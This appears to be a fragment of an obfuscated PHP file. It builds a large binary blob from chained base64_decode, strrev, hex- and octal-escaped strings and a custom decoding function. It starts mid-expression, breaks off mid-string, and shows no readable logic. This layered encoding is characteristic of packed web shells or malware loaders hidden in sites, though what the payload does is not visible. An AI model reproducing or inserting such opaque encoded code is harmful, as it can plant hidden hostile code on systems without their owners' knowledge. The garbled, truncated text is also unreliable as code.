·-éÎªÍ~«}#©Aüğ7Ñ¾').base64_decode('fu/CF3oa9mr8+SVarOPufTb+qOeip0N1K/MfZPa5rX37Pz5Yc8LMukWnT//N5Q2H7w==').base64_decode('dusBz+0258JK+vbJyldP+I75w9t2f/0Xh6XfVL7+06cvPFIb+upzW8/Nn3rT1qP/Zw==').base64_decode('3qx197/6+uk/nv3Mo0aia8ng2JMXHfnCN37y+D6fTv9r54t7f6P/wpc3tsTLv2xKfg==')."\xed\xeb\x1b\xee\x1c\x3f\x54\xdf\x70\xed\x96\xaf\x7d\xb6\xe5\xf1\x87\x2f\xf9\xc9\xd1\x9d\xcf\x5c\x77\xdc\xed\x3b\xf6\x5c\xff\x8d\x6f\xf7\x8e\x7d\x67\xc3\xba\x7b\x5f\xca\x1f\x3a\xb4\x79\xfa\xb5\x87".base64_decode('vjD/zuKNzz+47rKvl36w4Eeec67adH15/rlnaP41LZ91fNL7g70yTx592h9Wn7n83Q==')."\xa5\xd1\x8b\x7f\x7c\xdb\x49\xfb\xfe\xed\x9e\x73\x5a\x7e\x71\xe2\xc4\x23\xcd\x27\x3f\xe6\x3f\xe9\xf0\x93\x4e\x89\x8f\x5c\xff\xda\x65\xf7\xed\xdc\xed\xb2\x95\xb7\xbd\x32\x7f\xf4\xd9\xd6\xd1\x83\x6f"."\172\356\133\317\314\115\235\160\326\301\227\175\253\367\216\316\321\201\173\57\171\355\266\147\172\236\175\161\215\347\312\206\337\233\57\277\375\326\41\107\174\347\214\357\334\163\170\376\221".strrev('ºéÿé¿Ä°ÿ±y?Ì#ßµ’ªüµá¼Ÿ×âôÅuÎv¾ÏÙî8ßK‹Æk¼¿şüŸ')."\xdd\xe6\xdf\xbf\xe7\x3e\xf\x6d\xf7\xde\xfe\xca\xdd\x99\xb3\xef\x2b\x5e\xed\xe9\x9b\xfb\xc9\x39\x5f\x3e\xe8\x25\x3b\x3a\xf2\xb5\x85\x1d\x1f\x4f\x5e\xdb\xfb\xfc\xd7\x86\xfe\x78\xd9\xd0\x1d\x7b\xcf"."\235\161\316\143\57\377\371\237\257\254\273\173\325\255\225\341\201\53\36\332\173\341\131\221\223\67\77\160\314\345\277\76\151\325\113\263\336\377\313\363\27\217\374\156\357\67\256\77\273"."\163\315\127\162\7\237\171\325\253\37\116\157\372\336\253\117\355\262\117\332\244\75\374\370\7\177\74\164\367\344\346\363\236\131\230\231\76\255\53\371\340\65\135\177\371\354\255\45\305"."\xc3\xcc\xa5\x17\x9c\xf0\xfe\xab\xbb\x36\x85\xe7\x7c\xfc\xfb\x73\x17\x4c\x2f\xaf\xbc\xe9\xed\x13\x3f\x6b\x3e\xf4\xe5\x35\xbd\xf7\x2c\xf9\xac\x67\xeb\xfa\xd7\xee\x7d\xe2\xc5\xfd\x8b\xef\x76\x2e\x5d"."\335\340\363\337\374\352\332\373\276\71\163\257\256\33\336\333\357\371\366\123\137\372\304\274\354\322\377\176\162\301\5\267\376\347\330\117\76\175\347\327\352\345\307\176\364\257\137\357\170".strrev('4GgïËİÚ÷şÇşİøl6Ó±å½nŸñ÷Ş¶c¾ëÎóşGÇKSàñÛßŸúÙ÷Å÷').strrev('[+³‘·ñï»Í™ï¾÷ä{½Ïsw8ĞÍËoß~Ît¿}şñ·hÿÇËÄÇ¼<²$d|Ù')."\xe\xde\x70\xce\x7f\x6f\xd9\x78\x69\x65\xf5\xe1\x91\x9b\x12\x17\xbe\x7d\xeb\x9e\xb\x8e\xea\x3b\x6a\xe6\xc9\xa9\x40\xb8\x2e\xd9\x75\xc5\xc2\x73\xee\xcf\x7c\x5f\x9d\x7e\xf0\xf9\xaf\x1e\x78\xd3\x61"."\337\332\271\175\344\317\227\136\163\376\237\316\277\377\211\165\215\207\37\220\337\172\366\342\143\326\255\175\355\245\133\376\171\303\314\347\26\206\247\177\373\311\73\332\12\107\354\176\366"."\x23\x47\x6e\xfa\xf9\xa7\xa1\x37\xbb\x9b\x3b\x8f\x99\x79\xe7\xc0\x81\x7b\xfd\x69\xf2\xa1\xfd\x37\x5d\x73\xda\xf6\x8b\xe\x58\x75\x75\xfc\x67\x87\xdd\x7e\xd7\xc2\xb6\xf5\xc7\xfe\x3d\xd4\x7b\xc0\xe9".base64_decode('dV+36/LZ5On35Lcde/XaQzd89ED65Y8GDv7mxXfu27n8jUe3/f6w2/525VP7nLe5aQ==')."\xe1\x6b\xbf\xe9\x3b\xe6\x91\xb3\xce\x7a\x62\x70\xdb\xeb\xff\xdc\x38\xfe\xf4\xfe\xd1\x9d\xed\x17\x6f\x5b\xbd\xe6\x89\xb7\xcf\xb8\xa1\x6d\xd1\xc2\x19\x1f\xe5\x7f\xfa\xe2\xdf\xbe\x32\xe7\xd2\x25\x9e".base64_decode('F8/684l/iU97Krb/hmOvffaiXQvWvXLt8J4bmta+v6Dv/Ghb8M+5ZcH9vzeY+Edm/g==')."\xe5\xf6\x82\xe1\x4d\x4f\xde\xfc\xfc\x8d\x7b\xff\xf4\xc8\x1b\xf\xc9\x6e\xb8\xf1\x9e\x97\xe6\x19\x77\x3f\xf2\xe0\x1d\xc7\x6e\xd0\x27\xae\x4f\xde\x7c\xc6\xcf\x62\xd7\x97\x66\xad\xdc\x76\xf8\x4b\x77".base64_decode('3PbNK19+9LJbNz708uGPf/qr5O+H/rV9+spZ7125vOei9y89rvGvdure5Au5Fft/6w==').base64_decode('ifdPfbzhrH0vO/ChV945rrdiPNgz/PbRy2fpxz9/yIb82QPLOw68+KaxbNs+DyWUdg==')."\xf3\x8d\x47\xfb\xfe\xda\x16\xe9\x7d\xe1\xce\x7\xde\x3c\xf2\x95\xb6\xdd\xe3\xbf\xfc\xc7\x1\xef\x36\xb5\xef\x7f\xd5\xe3\x27\xef\xf7\xc6\x96\xf4\x8c\x85\x27\xbe\xf0\x6a\xf9\xf1\xad\x67\x8e\x9e\xf8"."\363\363\157\77\350\205\15\357\135\161\305\31\327\34\266\165\343\11\365\147\154\173\157\322\373\134\362\276\67\112\257\225\317\236\271\373\237\6\336\74\125\71\146\362\347\133\42\67\337".base64_decode('dO/QPTO2fCe4ou2JW5cd92b/XYtK/1N3ZEPrb+2zL93vVKV7jy+XvrRufMsFg+931g==')."\237\365\326\155\67\77\333\373\321\301\377\130\274\261\165\355\266\347\236\177\113\271\66\30\374\341\133\67\174\171\315\251\247\237\161\356\311\363\374\232\357\271\365\236\302\272\33\346\265".strrev('¯U¹õİß5í¼[­¯ÓOá¸şŸXß•óı;ÜÑ’îÿ/m…ãøïÃçúØo¯×°¼')."\273\271\367\362\173\136\316\151\77\273\162\336\73\67\35\262\377\245\335\326\261\263\336\370\166\152\201\272\355\345\353\137\130\371\356\23\263\37\175\364\312\350\300\361\67\357\232\161\320"."\x2b\x5b\xee\xfd\x7d\xff\xb7\x9e\xb8\xf6\xdc\xaf\xbf\xbb\xd7\x13\x2d\xf6\x27\xdb\xce\xdd\xeb\xc3\xdb\x9f\x3c\x25\x75\xe4\x6e\xdb\x6e\xea\x1f\x9b\xd9\x77\xd3\x86\x7d\x1e\x1b\xdb\xee\x7b\xe6\xe6\xd1".base64_decode('jtnP/PZGe8beezafXj8U3WT2njk8dMqS4YHr6/SVqTseD7Tcf/K/zbrzf3tf6YN/XQ==')."\276\353\351\255\113\376\373\357\354\5\352\277\76\175\357\221\133\237\372\317\77\357\277\343\207\113\267\176\374\366\113\237\134\376\237\177\77\171\106\354\251\313\66\175\343\17\73\236\270"."\xf6\x69\xff\x7f\x3e\xaa\xfc\xf5\xb3\x4f\xfd\x7\xdf\x7a\xcc\x31\x1b\x3f\x7c\xe8\x25\xf3\xbf\xa5\x7f\x7c\x70\xca\xc1\xea\xbf\xff\xf4\xe1\x47\xb1\xff\xfe\xf7\xf5\xa7\xc7\xaf\x99\xbe\xe7\xa7\x6d\x2f".strrev('»ïï»Êû^7'."\r".'şø»îó‹4në5çIúşËïğ=wóïğ|˜{=r‚Ó~šhÏa\\')."\x4b\x37\xda\x7b\xec\x75\xdf\x6e\x4f\xbe\xf9\x58\xeb\x21\x87\xbf\xf2\xd0\xff\x9c\x34\xfe\x87\xcb\x9f\xda\x79\xc6\x73\x91\xf9\x17\xf8\xf\x5c\xfd\xe2\xb\x2b\xaf\xff\x6c\xd9\xf4\x2d\xa7\xdf\x7f\x40"."\xf8\x47\xfb\xa7\xf7\x1e\x38\x3e\xbb\x48\x39\xf3\xd1\x8b\x7f\x7b\x42\xe8\x8e\xde\x8d\xfb\x74\xef\xb5\xe5\xcc\xcd\x3\x97\x7a\x32\x5f\x3b\x31\x9a\xb4\xbe\xfa\xad\xdf\x3d\xb8\xa7\xb7\x2e\xfd\xd6\x99".base64_decode('BzJbpoVzwYwhZQ1lzElQqATYnDmLgBG1c6WJETjCAbPWPBcYpgUL4cp1XjNkX7QIkg==').base64_decode('xsdygyMTQywZxL/pbLlojU7SCMDmz4VqS0PaYHEUJFBzFkBFI1rRHGYKJFZ2ctRIAw==')._kodDe('LkuDyhjKs0P0jfQ4jP9/0TErOYYrMb8xk1v5TL4owCRKBA+39tNC2RO4LLYe6nrAuCg=')._kodDe('Lk34Nnd99yKhfaAGY5AeqXGRY721kfvKp4GAVQn8Nkp7KRBJK3chcckia0IvxwkZkBM=')."\146\41\223\146\314\170\71\235\312\16\351\60\26\13\26\101\353\6\363\223\243\126\156\202\215\57\114\207\146\244\212\351\61\70\33\54\152\202\16\54\154\206\344\321\24\76\174\163\355"."\272\102\116\113\127\330\340\102\367\207\323\131\53\63\142\263\16\100\227\26\316\203\261\267\307\6\107\162\354\244\276\210\101\207\312\271\212\66\302\324\11\163\151\173\44\17\202\314\254"."\x59\xd1\xc6\x4b\x70\x44\x99\xc7\x3e\x52\x29\x4c\xe4\xc7\x33\x0\x6d\xe6\xb5\x14\x27\x52\xb9\xa\xcc\x53\x65\x38\x3b\x59\x4e\xc1\x41\x77\x6e\xb\xc\xe4\x1c\x86\x36\xf3\x16\x41\x97\x4a\xb9\xa1\xf4"."\44\23\107\226\47\254\222\316\144\250\13\347\101\343\347\63\365\272\254\141\216\217\201\122\301\202\171\120\301\120\1\41\365\10\303\246\105\120\246\205\65\112\57\214\333\271\101\215\141".base64_decode('+0JWJTQoNTSYzdjwxXnzILk8PjKYTQFSj+lDwxpT7Z/MTwyaWomdxcbyZSZmaVkAnw==').base64_decode('bmbT1gKABTDl1oidTTG53tw5kGtkaDBdTIGktQU6NZcdVYYmc8VsBsoYE+P66CS7aA==').base64_decode('WQDDMr+FIXwzVJktlHQjDQNVHrSLo0xAtGjBPDYA89kqgcDCRYDWLXOhmkHdyhRH4Q==')."\333\345\124\321\316\114\200\326\100\151\170\144\310\146\372\25\372\360\120\321\66\241\125\251\302\370\304\240\315\220\222\221\215\5\115\20\260\354\361\102\76\3\171\27\262\21\133\70\177"."\x1\x5b\x5a\xac\xff\xb\xa1\xd\x43\x95\x89\x8c\xad\x31\xb\xa4\xf1\x52\x2e\x33\x5c\x61\xeb\x9c\x8f\x15\xf4\x29\x33\xae\x6b\x93\x6c\x41\xb4\xb0\x85\x66\xeb\x95\xdc\xf0\x4\xf4\xa2\x85\xd5\x8b\x26"."\xa9\x89\xd5\x3\x3\x60\xe7\x86\x2c\x7d\x14\x96\xc6\x68\x2e\xab\x95\x27\xc6\xd8\xe2\x82\xba\x16\xc0\x27\x17\xb2\xa9\x6d\x9e\xcf\x6\x8d\xa1\x63\x36\x3d\x38\x59\x49\xc1\xd\x48\xf3\x2\x40\xb3\xb9"."\xf3\x9a\x19\x2e\xc0\x48\x14\xc7\xb4\x6c\x61\x18\x96\x90\x66\x96\x8b\xa3\x79\x3e\x6a\x8b\xd8\x2\x1f\x9f\x2c\x8d\xa5\x58\x83\x9b\xd9\x97\x58\x72\x6a\xa8\x98\x65\xd8\x57\xae\x8c\xda\xdc\x32\x15\x1d".base64_decode('5Ye0DMxVaqyQG9WKrLML2FKew6YGIJn0pDmULTM0LwwaNlNjZaqv7Vp6mOGvrD/K7Q==')."\xdd\x8a\xbe\x82\x56\xe4\x6a\x3b\x5d\x6\x6b\x8e\x64\x23\x21\x67\x18\xd6\x75\xa6\x68\xe\xbd\xb4\x85\x5e\x8\xe8\xab\x2\xdc\x28\xe8\x42\xae\x4e\x6f\x32\x58\x49\x21\x34\xc0\xe2\x1b\x49\xb3\x4\x47"."\23\162\55\351\242\55\45\243\230\43\65\141\233\145\256\313\102\265\344\174\270\205\76\271\253\153\13\154\36\152\134\211\202\54\331\262\306\114\266\251\14\233\231\164\336\254\144\34\265".base64_decode('ZlKOOjmUSTncKYNTwFE9DlVvBnMMVopMmipHfGy4U9KEUmG/rVnDPhnslVONImpFPg==')."\357\163\232\353\252\344\17\243\161\304\44\324\302\372\321\105\161\201\156\15\113\3\217\355\154\173\173\324\144\40\261\122\122\45\304\166\240\14\235\124\241\326\57\165\113\324\40\215\243"."\74\203\316\41\140\30\362\366\255\367\357\370\341\226\235\347\337\266\163\363\55\73\356\73\357\355\133\156\333\361\300\371\50\272\375\236\263\166\334\162\331\73\27\235\274\375\236\315\333".base64_decode('7znu7VPufP8XZ+744a1vn/jAjkuu23H1Kdvvf+DtB0/Zdd0Z2++5eeclp+04+a7t9w==').base64_decode('b9lx6k92nPLDnedt3v7AJSj/zlNFzSjbjpsvxGV/ccKOe+55+4rreOr7vzgeFhaQsg==')."\x15\xba\x8d\xcd\x67\x99\x7e\x18\x19\x1d\x65\xa9\x2\x8\xa9\x5b\x3e\xa5\x27\xaf\xa3\x11\x56\x88\xd9\x36\x56\x26\xb3\x73\x7a\x59\xb1\x89\x52\x99\x86\xfe\x16\xcd\xa2\x97\x22\x1c\x35\x4d\xb6\x14\xa3"."\210\223\25\66\67\76\216\224\111\275\120\302\250\5\243\344\247\346\213\16\373\1\11\377\152\15\63\115\250\201\126\170\254\305\134\65\340\40\134\17\142\211\244\62\250\41\100\246\125"."\x19\x44\xc5\x14\x66\x85\xa4\xd8\x26\xb\x17\x26\xf8\xa4\xbb\x16\x41\xcd\x69\xe5\xcd\x60\x53\x9b\xe5\x17\x3\x42\x5e\xd\xd\x93\xc\x43\xe8\x9d\x4f\x15\x4a\x91\x55\xe5\x24\x9\x8e\xf5\xe6\x24\x26"."\162\222\163\44\100\240\114\164\31\74\12\155\212\107\41\67\330\212\323\126\27\353\46\260\373\176\171\215\311\315\57\353\245\74\277\275\302\62\331\232\203\50\267\106\276\76\167\165\55".base64_decode('UWMYeecciWhdV+waGeXRlgXYhhnMI0InblmJdoHoBo0KwTn6EKeTZT1jMCVovUByAg==')."\175\364\111\327\126\324\6\210\153\142\247\321\162\50\73\156\340\226\54\53\345\112\330\73\203\275\170\31\130\127\63\113\56\251\15\20\26\66\115\62\64\357\276\325\343\213\247\243\135"."\362\75\200\263\265\172\275\136\111\0\55\124\340\160\10\252\23\167\332\10\26\302\53\173\52\170\7\327\373\100\113\76\233\325\55\273\225\330\104\52\263\25\324\320\205\276\146\24\40"."\213\143\236\157\1\12\222\21\203\5\335\17\243\130\261\230\241\316\114\337\134\140\272\255\305\240\264\262\230\320\225\66\251\371\0\27\245\52\305\74\203\242\40\312\22\257\24\361\154".base64_decode('tzr7rBczUqHFWtqWalUHYVB9Yjy02SJdz4C1ml8apTHIwMp2O3EA9d/L0QJNL2IdMg==')."\x16\x51\xa0\x85\xdd\x7\xaa\xb4\x24\x73\xf1\xb8\xc0\x28\x5c\x9c\xc\xd7\xe7\x14\xb5\xe5\x29\x2f\x21\xf6\xa4\xc8\x35\x67\xad\xbc\xc6\x6e\x4b\x2d\x6c\x88\x52\xd4\x39\xfe\x55\x2c\xd9\x94\x40\x17\x4b"."\33\353\234\253\150\227\267\4\346\252\31\3\262\106\302\355\152\107\70\56\312\251\245\212\333\275\207\354\125\44\320\23\126\23\211\230\344\354\203\330\252\256\121\127\306\72\324\140\54"."\xb6\x32\xc\x48\x9\xd3\xd0\x2a\xd1\x50\x6c\xe6\x27\xee\xc6\x71\x4c\x98\xfb\xe1\x8b\x26\x59\x33\x4e\x66\x52\xb0\x3b\x5\xbc\x11\x27\x14\xd0\x20\x45\xd8\x1f\xec\xa\xc4\xb9\xde\xfe\x3c\x5f\x93\xaf"."\131\344\105\37\124\261\371\102\33\63\335\116\44\3\361\32\116\65\250\263\15\230\42\160\260\1\5\272\142\253\225\140\54\322\333\35\115\120\137\22\24\36\215\111\351\104\73\33\222".base64_decode('mcuN6mSoPtQTCQRDSjiajDHzC64gSwxvEjzOhqBs6dylBpSnEdk4SK6R1wRI3eep7w==')."\257\353\237\325\337\320\337\270\336\327\157\15\370\245\135\315\220\247\7\42\75\35\320\275\126\36\312\130\260\234\273\23\211\243\301\112\60\26\17\4\43\254\51\355\201\4\4\143\301".strrev('½o·”8`LóºİÎÖzÚîg-ËŒÁ‰ˆ]ÁyØO‹ÎÑTfÚqÙo×k;ïÛíÑúì'."\r".'0').base64_decode('e/sDD+760XU7brlw55Z7d118Ek145/rbd5x+HW+Y8s55W3eedQ1nZigP40Gl3zl58w==').base64_decode('rgduwazMVcft/PkZOy/ZvOP0K3ZcdN2us27dceWJO36w+e1bz5/hRiQa72NTASbH/g==')."\143\260\205\65\35\336\176\153\66\36\332\106\364\333\200\255\71\320\57\123\112\47\212\312\107\367\206\242\301\220\333\72\112\216\202\77\222\131\24\103\250\236\16\360\235\26\370\63\141"."\x71\xe2\xd6\xa0\xad\x7e\xca\x56\x6c\x84\xf9\x97\x1a\x25\x35\xa6\x23\x94\x8\xc6\xc3\xed\x21\xb0\x17\xe0\x13\x35\x93\x70\x5e\xa0\xbe\x81\xa0\x89\xf8\x2a\x1e\xe6\x86\x9e\x55\xfe\x63\x94\x6\x86\xcc".base64_decode('jYqjI5ovbeYrhSJprFKHFcjqPHhHIqZaSh3eXRFAT6Ol14CdThB94/q19Z4mT3OjAg==').strrev('ì³5yÍË€iæŠZsJ½j+ŒK´pÒº•š{5ˆå\'ˆøç/:ÚÔ£)p	heÎ')."\xb2\x66\x20\xf2\xa6\xa4\x3d\x1c\xc4\xcb\xa3\x5f\x87\x9b\x98\xb4\x4f\x94\xa0\xf3\x84\x72\xb8\x61\x4a\x20\xda\xe1\xcc\x49\xbd\xcb\xf4\xd4\x13\x75\xcf\xb4\xcf\xe6\xde\x2b\xd8\x34\xd7\x37\x2a\x29\xb0".strrev('xššê&¼±léC'."\n".'¦J'."\0".'¢lY¥›Gj,MMóà¬ôN³'."\r".'1Í£9ŠH‘¨Â').strrev('ÉC	m„w	¬aYpÀûË^ï °:‘–V?iåOíÄiÄŸ8bØÄr!5àF6'."\n".'')."\x60\x17\xc5\xf2\x84\x84\xe6\x99\xd4\x4c\x7\xa2\x8a\xe1\x54\x1c\x28\xc2\x8f\x18\x90\x8f\x2e\x17\x4c\x10\xf6\x21\xf9\xc2\xd1\xce\x58\xbc\x9b\xda\xd0\x25\x82\x5d\xa1\xee\x80\xf\x88\x38\xc5\x4\x9a".base64_decode('H/NdSptSjykfBdU7hp98iA1ZknwVrSvVRkwUHYVSFhoDs68QU3iNFGmrp446oEru3Q==')."\x2a\x16\x4f\xaa\x68\x0\x80\x3c\x4b\x54\xb7\x5e\xda\x2d\x24\xdd\x74\x6c\xa\x36\xca\xce\x6\x83\x88\x2b\x32\x99\x7f\x92\x4c\x8a\x39\xc1\x42\x95\xe3\x3a\x83\xb1\x68\x67\x98\x99\xb\x76\xc0\xc9\xbb"."\x94\x31\x1d\x99\x3a\xe2\x61\xec\x9\x2\xbe\xaf\xb0\xaa\x24\x23\x4d\x14\x11\xca\x22\x28\x52\x1a\xcb\xf0\xb0\xb0\xef\xc7\x9\x7c\xcf\x47\x11\xb1\xe5\xa3\x8\xdf\x6c\x70\x2e\xc9\x5b\x17\xfe\x7e\x22"."\xca\xc3\x82\xf1\x45\x91\xde\x4\x33\x13\xc1\xd4\x77\x75\x7\xf\x77\x71\x6b\x6e\x9c\x10\x8b\x4b\x91\x40\x3c\xd0\x9d\xe0\xd1\xf8\x6a\x6e\x76\xc2\x61\xd4\xfc\x44\x8d\xf6\x76\xb\x8a\x1f\x9\xac\x42"."\310\22\23\14\12\243\326\15\276\131\313\32\373\251\105\37\15\322\237\345\54\206\255\234\6\66\64\173\224\371\233\32\41\17\167\352\140\347\214\42\343\74\361\127\216\216\250\221\330"."\12\32\47\136\304\102\305\214\70\247\50\175\12\142\203\223\202\15\266\330\326\305\127\203\202\160\130\241\146\302\112\64\266\72\40\34\123\111\11\0\21\176\252\374\307\364\365\217\365".base64_decode('+xCzYK0XFnod7QpjQ4LknE/FAVA6wLbR9R7YMdS8mWWSaEQQGbtAf9ewAKGVUAAdfg==').base64_decode('S3lmqkdtBNX+jf1H9nt91CwSMy/9HtEkNbQG7bGJhMOmUyW+l6B21EsI0VVLI0vgBw==')."\x4e\x62\x4b\x80\x3d\x85\xe8\xd2\x36\x3e\x99\xa1\xa3\x37\x46\xd1\xdf\x15\xc9\x8d\x21\xf4\x37\x82\x7e\x22\x49\x34\x5d\x6\xcf\x80\x96\x64\x24\xbc\x32\xb4\x11\xff\x23\x12\x1a\xf9\x40\x52\xeb\x27\x67".base64_decode('gXB0I/oXEZiN4ai7svZQcnUoRDOwMPyKrIjgQFclL3PYFAGShWkCVK2qDWQwvQOzGw==')."\125\325\157\365\2\276\160\307\27\15\365\107\64\327\303\36\22\110\4\5\365\165\40\104\65\56\20\303\1\47\42\160\337\151\20\137\21\217\365\366\110\361\256\300\252\160\164\5\213".base64_decode('+Wex0CyoWukIJ9AQBRkyCpduchwYTsIWyVyvA6U7EGVHEYllx4cBSpmdq6y9NxzpkA==')."\xcd\xd8\x71\x46\xd8\x50\x8\x55\x87\x3d\x65\x26\x6b\x1c\x8b\x13\x83\x76\x16\xc1\x43\xce\xc2\x4\xdd\x58\x84\x8c\x1\x8b\xd0\x1\x60\x31\x32\x5c\x2c\x42\x5c\xc7\xb1\x8\xe9\x28\x8b\xe0\xd3\x49\x28"."\312\322\320\211\21\235\366\330\61\60\247\215\162\73\314\305\231\224\344\25\3\323\140\37\225\240\141\337\50\350\24\247\161\71\247\113\110\112\344\125\222\30\200\52\26\52\222\71\270"."\237\202\20\267\111\200\350\267\177\375\62\302\15\257\147\210\111\155\216\355\244\141\347\35\137\1\333\104\364\225\60\61\10\225\276\303\214\67\210\164\120\65\45\11\65\331\250\145\200"."\220\107\121\161\66\210\176\205\130\7\53\124\22\241\60\215\72\217\120\234\56\255\347\47\43\360\71\351\201\137\150\321\127\351\117\77\104\231\10\3\14\162\352\75\260\311\62\43\16".strrev(''."\n".'ÂQ”=cÄwˆµáS<™Ã“‡íQW{t¼÷Á”¬£GZ Ìl‚Ñªn¿¿¸éç')."\xf5\xec\xa0\xd4\x53\x71\x77\x3d\xb0\x56\xc1\x78\x8\xaf\xe\x9a\x8b\xa5\x35\xd4\x3b\x84\x53\x4b\xeb\x15\x30\xf3\x6e\x74\x96\xa\x47\x3b\x42\x6b\x94\x7a\x23\x33\xae\x6a\x9a\xa\x85\x15\xb4\x16\x59"."\x45\x4a\x55\x4d\xac\x6\xda\x56\xb8\xc4\xb1\x72\xe6\x98\x22\xa3\x17\x3b\x2f\x7\x29\x2c\x29\x50\xae\x8a\x35\x23\x3e\x1a\x98\x49\xad\x7\xe\xe5\x3c\x85\x72\xc4\x34\x29\x9c\x40\x1b\x76\x24\x42\x7a"."\212\222\14\13\63\262\36\205\273\122\300\100\174\370\240\2\120\250\210\45\320\212\150\122\150\115\62\36\300\100\302\175\116\333\7\375\41\4\5\237\216\312\5\215\332\231\22\236\315"."\267\36\204\4\353\35\54\42\145\36\61\223\10\30\104\266\74\251\117\74\205\110\12\350\60\313\162\204\225\300\165\323\130\117\74\334\35\210\257\205\41\23\147\0\130\201\146\336\141"."\155\54\42\206\325\53\331\273\107\121\253\145\373\167\72\307\234\302\242\363\54\243\260\250\65\260\0\360\314\3\303\103\75\175\252\334\234\231\11\121\32\230\131\260\207\5\230\133\11"."\142\152\305\344\126\5\104\162\170\114\314\32\340\76\314\212\234\52\33\213\11\127\244\170\223\304\223\314\250\175\147\240\67\42\103\140\250\224\225\241\265\237\263\106\130\113\153\255\21".base64_decode('lsbEMXy1QX8a5kH/qKeLhhZ0Jq0UsSsX7ggRWgV7a28ypqL9Ix7C1Bx6xIdVaq907g==')."\226\47\5\252\301\31\270\137\327\317\351\32\313\123\253\153\274\74\227\74\205\242\53\302\321\120\133\367\104\70\21\350\126\130\303\101\266\206\335\37\56\204\172\302\61\65\202\170\142".strrev('ip¤«I4±p$¼ "¢Ûswt(“Ø®H®]¹’„Óâ–ğª\'7d¥õò c…ŸU')."\171\273\202\362\56\27\226\206\331\212\123\160\146\312\245\54\26\331\125\307\307\335\112\333\62\130\50\227\213\133\135\166\213\314\75\270\101\201\136\311\313\1\56\254\260\17\222\173\235"."\242\263\171\150\277\314\63\367\114\252\56\172\123\320\55\213\337\356\222\303\17\13\332\71\341\344\101\366\40\332\321\316\106\256\122\264\23\172\36\144\354\35\51\242\232\57\354\346\204"."\155\222\244\262\117\256\112\304\164\120\177\157\256\202\120\123\230\367\127\312\45\200\21\341\62\24\337\114\210\72\7\330\21\136\164\162\322\140\73\233\373\216\217\67\262\150\366\350\345"."\x82\x41\xae\x63\x56\x8b\xdb\x16\x9e\xae\xcb\x8\x50\x6b\x80\xbd\xcd\xd2\x17\x24\xe3\x47\x1c\x85\x89\xc4\xf7\x8d\x92\x7d\x49\xa5\x88\xda\xe5\x95\x2d\x96\xd0\xc4\x12\xa0\x64\x23\xc1\x9c\xdc\xd1\xd8"."\x2\x50\x97\x42\xc8\x3\x81\x2c\x40\xd8\x6f\x99\xa5\xf8\x84\x13\x1b\x52\x27\xe6\x5d\xbc\xc2\xa9\x44\x46\x93\xd\x42\x25\x87\xde\x33\xe4\x19\x27\x53\x27\x10\x6f\xd0\x90\x3d\x4c\xf8\x84\xf7\x54\x8e".base64_decode('y8v5gGNDabgkx3zwoCq1pYfnT3M32XQ0pGEmABokq09pFY3oQi01yxMSDkjQbuZ3CQ==').strrev('X?ÈÈArÍ{Ö)Úû’½BâûPº^6û`¯ÚŠbØéõ”á å¸ğmĞò6˜F·|')."\x26\xb2\x9c\x2f\xfe\x60\x5c\x17\x5b\x32\x2a\x46\xc\xd4\xbe\xb0\x90\xa0\x7f\xe4\x4b\xa4\x90\x44\x33\x5d\x65\x8\x3a\x52\x63\x1a\x98\xf9\x1c\x24\xb\x1c\x43\x84\x3a\x1a\x53\xbb\xd0\x5e\x10\x63\x1c".strrev('‹ÆBÚÏèS±/€S)ˆyVDöL"uéõ.L[p¾\'í&†#`R•—´%aƒ')."\x58\x97\xd1\x6d\xee\x3e\x9\x53\x33\x66\xd\x89\xdb\x2c\x19\x48\x17\x38\xf5\x1b\x93\x1c\x72\x6a\xa3\x3a\xb6\x47\x63\xd2\x8e\x2a\x9d\x16\xe8\x4a\x75\xe7\xa0\x89\xf8\x56\x2a\x11\xeb\x8d\xb3\xab\x13"."\34\307\42\43\65\36\12\256\345\267\30\34\332\31\130\345\206\204\261\310\57\260\242\46\230\13\242\60\234\234\370\324\170\14\113\354\102\221\116\127\201\104\27\167\240\352\204\251\221"."\160\164\145\315\4\304\67\164\113\105\50\60\234\14\165\273\141\316\32\22\241\100\234\171\336\305\361\366\110\54\50\45\207\143\325\43\301\31\23\16\244\362\76\12\364\37\323\320\277"."\x81\x1c\x59\x5a\xd1\xc9\x25\xb3\x11\xb\x6\xbc\xea\xc0\xec\xc6\x65\xfd\x9b\x1a\x1b\xfa\xfd\xcb\x7c\xb3\xb8\x3c\x8b\x92\x2b\xc9\xe6\x76\xa\xb0\xc5\x36\x91\x56\x37\x0\xef\x3f\xc\x48\x8b\x41\xcc"."\xef\xf3\xc1\x47\x78\xc0\xdf\xef\x67\x3e\xba\xfc\x3c\x91\x67\x72\xed\x1c\xe0\xee\x3a\x41\xdd\x1c\x39\x9a\xe7\xf2\x6\xc2\xac\xee\x7d\x6e\x53\x31\x95\x99\x84\x31\x7a\xaa\xd\xb2\xab\xfa\x30\xbd\x12".strrev('Ff$¬v'."\n".'é˜ÎbÄF±L3ägÈÑ™©’V+9ßÑ™\\5–LR0œ†|kU')."\xd8\x43\x23\x90\xcf\x51\x5\x22\xe3\xc3\xe2\xe4\xd\x6b\x31\xc1\xd6\x6c\x11\xed\x90\xb0\x5\x7\x11\x23\xb9\xa2\x2b\x7c\xd4\xca\x48\x77\x34\xd6\x73\x74\x3c\x91\xec\x5d\xb5\x7a\xcd\x5a\xf0\x2e\xd9"."\312\120\145\120\361\62\277\150\340\63\325\77\252\225\375\243\314\325\371\52\174\16\320\55\277\314\137\161\40\352\43\166\107\313\174\235\121\361\0\117\305\64\303\137\73\211\326\346\57"."\x14\xed\xe6\x29\x72\xf4\x94\xf5\x94\x69\xda\x53\xa4\xae\xea\xfe\xfc\x8a\x21\xb1\xaf\xdf\x1a\xe0\xb8\x99\xd1\x47\x21\x28\xb4\xd2\x2c\x71\xfa\x1\xd6\xc2\x2b\xbb\x5c\xc7\xd8\x2a\x73\x7b\x99\x94\x8b"."\7\0\200\170\41\103\342\24\4\220\73\44\246\321\11\166\3\102\234\221\111\16\175\301\25\350\12\354\12\224\271\1\35\41\16\52\335\336\55\107\274\134\213\234\246\13\227\276\43".base64_decode('XnQ6dMRdHi6xJgL364sjFo/JS4HsElyxBu9FXa6FyIHCcJOoH7Yqc8EzeSfiipnDHQ==')."\xd3\x26\x8e\xd4\x1\xe7\x3d\x8a\xf0\x70\xcc\x84\x9a\x4e\xd7\xc5\x6c\x9\x10\xf7\x37\x82\x69\x4e\xcb\x3e\x11\x18\x19\x2d\xc\xb\xc5\xad\xc2\x30\x57\xab\x48\x3b\xd8\x8\xbc\x63\x8b\x58\x59\xe2\x14"."\xe0\x21\x1\x94\xd6\x3e\xc